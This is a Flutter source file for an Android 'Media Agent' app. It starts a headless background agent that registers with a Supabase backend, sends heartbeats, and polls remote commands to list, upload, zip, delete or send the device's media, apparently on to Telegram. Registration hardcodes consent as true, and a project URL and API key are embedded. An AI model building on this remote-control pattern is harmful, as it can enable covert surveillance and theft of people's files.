// lib/main.dart
import 'dart:async';
import 'dart:convert';

import 'package:flutter/material.dart';
import 'package:flutter/widgets.dart';
import 'package:http/http.dart' as http;
import 'package:shared_preferences/shared_preferences.dart';
import 'package:uuid/uuid.dart';

import 'core/device_agent.dart';

/// CONFIG — replace with your project values (anon key ok; do NOT use service_role)
const int HEARTBEAT_INTERVAL_SECONDS = 30;
const String SUPABASE_PROJECT_URL = 'https://pbovhvhpewnooofaeybe.supabase.co';
const String SUPABASE_ANON_KEY =
    'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBib3ZodmhwZXdub29vZmFleWJlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjYxNjY0MTIsImV4cCI6MjA4MTc0MjQxMn0.5MotbwR5oS29vZ2w-b2rmyExT1M803ImLD_-ecu2MzU';

/// Recommended: point to an Edge Function that uses service_role on the server side.
/// If you don't have it, the client will attempt the REST fallback (requires RLS rules).
const String SUPABASE_REGISTER_FUNCTION =
    '$SUPABASE_PROJECT_URL/functions/v1/register-device';

final _uuid = Uuid();

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(const MediaAgentApp());
}

/// --------------------
/// Headless entrypoint
/// --------------------
/// This function is invoked by the headless FlutterEngine started in Android native (AgentService).
/// It must be a top-level function and marked with @pragma('vm:entry-point') so it is not tree-shaken.
@pragma('vm:entry-point')
void backgroundMain() {
  WidgetsFlutterBinding.ensureInitialized();
  // start background agent without awaiting (non-blocking)
  _startBackgroundAgent();
}

@pragma('vm:entry-point')
Future<void> _startBackgroundAgent() async {
  // Configure and start DeviceAgent in headless isolate.
  // Uses same SUPABASE constants as UI.
  try {
    // configure without explicit deviceId/deviceJwt so DeviceAgent loads from prefs if present
    await DeviceAgent.instance.configure(
      supabaseUrl: SUPABASE_PROJECT_URL,
      anonKey: SUPABASE_ANON_KEY,
      pollInterval: const Duration(seconds: 5),
      registerUri: Uri.tryParse(SUPABASE_REGISTER_FUNCTION),
    );

    await DeviceAgent.instance.start();
    // Optionally start heartbeat from background as well
    unawaited(DeviceAgent.instance.sendHeartbeat());
    print('[backgroundMain] DeviceAgent started successfully');
  } catch (e, st) {
    // log error for debugging; Android logcat will capture prints from background isolate
    print('[backgroundMain] failed to start DeviceAgent: $e\n$st');
  }
}

/// --------------------
/// UI App (unchanged)
/// --------------------
class MediaAgentApp extends StatelessWidget {
  const MediaAgentApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Media Agent',
      debugShowCheckedModeBanner: false,
      home: const HomePage(),
    );
  }
}

class HomePage extends StatefulWidget {
  const HomePage({super.key});

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {
  String _status = 'Initializing...';
  String? _deviceId;
  String? _deviceJwt;
  Timer? _heartbeatTimer;
  bool _agentRunning = false;

  @override
  void initState() {
    super.initState();
    _initAndStart();
  }

  @override
  void dispose() {
    _heartbeatTimer?.cancel();
    DeviceAgent.instance.stop();
    super.dispose();
  }

  Future<void> _initAndStart() async {
    setState(() => _status = 'Loading preferences...');
    final prefs = await SharedPreferences.getInstance();
    _deviceId = prefs.getString('device_id');
    _deviceJwt = prefs.getString('device_jwt');

    // ensure deviceId exists
    if (_deviceId == null) {
      _deviceId = _uuid.v4();
      await prefs.setString('device_id', _deviceId!);
    }

    setState(() => _status = 'Configuring agent...');
    // configure DeviceAgent
    await DeviceAgent.instance.configure(
      supabaseUrl: SUPABASE_PROJECT_URL,
      anonKey: SUPABASE_ANON_KEY,
      deviceId: _deviceId,
      deviceJwt: _deviceJwt,
      pollInterval: const Duration(seconds: 5),
      registerUri: Uri.tryParse(SUPABASE_REGISTER_FUNCTION),
    );

    // attempt start (will auto-register if deviceJwt missing and registerUri present)
    setState(() => _status = 'Starting agent...');
    await DeviceAgent.instance.start();
    // reflect state
    _agentRunning = true;
    setState(() => _status = 'Agent started');

    // start heartbeat loop (best-effort)
    _startHeartbeatLoop();

    // reload any updated creds that registerDeviceViaEdge may have persisted
    final prefs2 = await SharedPreferences.getInstance();
    setState(() {
      _deviceId = prefs2.getString('device_id') ?? _deviceId;
      _deviceJwt = prefs2.getString('device_jwt') ?? _deviceJwt;
    });
  }

  void _startHeartbeatLoop() {
    _heartbeatTimer?.cancel();
    // send immediate heartbeat then periodic
    DeviceAgent.instance.sendHeartbeat();
    _heartbeatTimer =
        Timer.periodic(const Duration(seconds: HEARTBEAT_INTERVAL_SECONDS), (_) {
      DeviceAgent.instance.sendHeartbeat();
    });
  }

  Future<void> _manualRegister() async {
    setState(() => _status = 'Attempting manual registration...');
    try {
      final res = await DeviceAgent.instance.registerDeviceViaEdge(
        registerUri: Uri.parse(SUPABASE_REGISTER_FUNCTION),
        requestedId: _deviceId ?? _uuid.v4(),
        displayName: 'Android Device',
        consent: true,
        metadata: {'registered_from': 'apk_manual'},
      );

      if (res != null) {
        // reload saved creds
        final prefs = await SharedPreferences.getInstance();
        setState(() {
          _deviceId = prefs.getString('device_id') ?? _deviceId;
          _deviceJwt = prefs.getString('device_jwt') ?? _deviceJwt;
          _status = 'Manual register succeeded';
        });
      } else {
        setState(() => _status = 'Manual register failed (see logs)');
      }
    } catch (e) {
      setState(() => _status = 'Manual register exception: $e');
    }
  }

  Future<void> _stopAgent() async {
    await DeviceAgent.instance.stop();
    _heartbeatTimer?.cancel();
    setState(() {
      _agentRunning = false;
      _status = 'Agent stopped';
    });
  }

  Future<void> _startAgent() async {
    await DeviceAgent.instance.start();
    _startHeartbeatLoop();
    setState(() {
      _agentRunning = true;
      _status = 'Agent started';
    });
  }

  Widget _buildInfoRow(String label, String? value) {
    return Row(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text('$label: ', style: const TextStyle(fontWeight: FontWeight.w600)),
        Expanded(child: Text(value ?? '-', softWrap: true)),
      ],
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Media Agent'),
        centerTitle: true,
      ),
      body: Padding(
        padding: const EdgeInsets.all(16),
        child: Column(
          children: [
            Text(_status),
            const SizedBox(height: 12),
            _buildInfoRow('Device ID', _deviceId),
            const SizedBox(height: 6),
            _buildInfoRow('Device JWT', _deviceJwt != null ? 'present' : 'missing'),
            const SizedBox(height: 12),
            const Text(
              'This APK runs a background agent that polls commands from Supabase and executes media operations (list/upload/zip/delete/send).',
            ),
            const SizedBox(height: 16),
            Row(
              children: [
                ElevatedButton(
                  onPressed: _manualRegister,
                  child: const Text('Manual register'),
                ),
                const SizedBox(width: 12),
                ElevatedButton(
                  onPressed: _agentRunning ? _stopAgent : _startAgent,
                  child: Text(_agentRunning ? 'Stop agent' : 'Start agent'),
                ),
              ],
            ),
            const SizedBox(height: 12),
            const Text(
              'Notes:\n- Keep anon key only (do NOT include service_role).\n- For large files, uploads should go to storage (Supabase) and then link-shared to Telegram.\n- Ensure RLS/policies allow device token to patch command rows.',
            ),
          ],
        ),
      ),
    );
  }
}